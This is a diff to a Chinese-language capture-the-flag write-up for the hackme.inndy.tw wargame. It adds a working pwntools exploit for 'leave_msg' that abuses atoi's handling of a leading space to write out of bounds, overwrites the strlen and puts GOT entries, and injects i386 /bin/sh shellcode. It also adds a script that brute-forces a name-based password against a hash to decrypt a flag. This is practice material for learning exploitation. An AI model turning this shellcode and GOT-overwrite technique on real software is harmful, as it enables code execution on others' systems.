@@ -1327,6 +1327,35 @@ r.send(p)
 r.interactive()
 ```
 
+## 72 leave_msg
+這題的程式是先讓你輸入一段訊息，再讓你輸入一個 index 來存放那段訊息，但是 index 有限定的範圍，因此先繞過這個限制達到任意寫。
+
+他這邊是用輸入 slot 的最前面字元是否為 "-" 來判斷負數，但 atoi function 中，第一個字可以是空白，所以輸入 "<空格>-<index>" 就可以達到任意寫了
+
+接著可以把這個值寫到 got section，hook library function，但又有另一個限制是他會用 strlen 來限制長度要小於 8，所以可以先把這個 function 先蓋掉後再來寫 shellcode
+
+```python=
+context.arch = 'i386'
+#r = process("./asset/leave_msg")
+r = remote('hackme.inndy.tw',7715)
+elf = ELF("./asset/leave_msg")
+
+data = 0x0804a060
+shellcode = b"\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"
+strlen_got = elf.got['strlen']
+puts_got = elf.got['puts']
+
+r.recvuntil(b'I\'m busy. Please leave your message:\n')
+r.sendline(asm('xor eax, eax; ret'))
+r.recvuntil(b'Which message slot?\n')
+r.sendline((' ' + str((strlen_got - data) / 4)).encode())
+r.recvuntil(b'I\'m busy. Please leave your message:\n')
+r.sendline(shellcode)
+r.recvuntil(b'Which message slot?\n')
+r.sendline((' ' + str((puts_got - data) / 4)).encode())
+r.interactive()
+```
+
 # Crypto
 
 ## 81 easy
@@ -1408,11 +1437,43 @@ for i in range(0, 100, 2):
 
 幾次嘗試過後發現將key轉為小寫就可以了。
 
+# Lucky
+## 99 you-guess
+還真的就是用猜的，不過他給的 code 裡面有一行
+```python=
+key = bytes.fromhex(sha512('%s really hates her ex.' % password))
+```
+所以猜說 password 可能是個人名，接著在網路上找個人名 list 試就好了
+
+避免你在格式上浪費時間，人名的第一個字是小寫...
+```python=
+import hashlib
+import sys
+
+def sha512(s):
+    return hashlib.sha512(s.encode()).hexdigest()
+
+f = open('./asset/names.txt')
+names = f.readlines()
+f.close()
+for password in names:
+    password = password[:-1]
+    h = sha512('your hash is ' + sha512(password) + ' but password is not password')
+
+    if h == '2a9b881b84d4386e39518c8802cc8167ec84d37118efd3949dbedd5e73bf74b62d80bf1531b7505a197565660bf452b2641cd5cd12f0c99c502a4d72c28197f2':
+        print('found')
+        key = bytes.fromhex(sha512('%s really hates her ex.' % password))
+        encrypted = bytes.fromhex('20a6b2b83f1731a5bafdc19b4c954cd34419412951e85de45fb904fc5c1a9470eda8d58483e1fb66e3e13f656e0677f75fccb6ff0577e42b5c53620d10178c0f')
+        flag = bytearray(i ^ j for i, j in zip(bytearray(key), bytearray(encrypted)))
+        print(flag.decode().strip(',.~'))
+
+print('end')
+```
 
 # Forensic
-## 98 easy pdf
+## 100 easy pdf
 轉為xml格式後ctrl F搜尋就有了
 
-## 99 this is a pen
+## 101 this is a pen
 轉為doc格式後把第二頁的圖片解群組後，慢慢刪掉其他的圖片後就可以找到了。
 
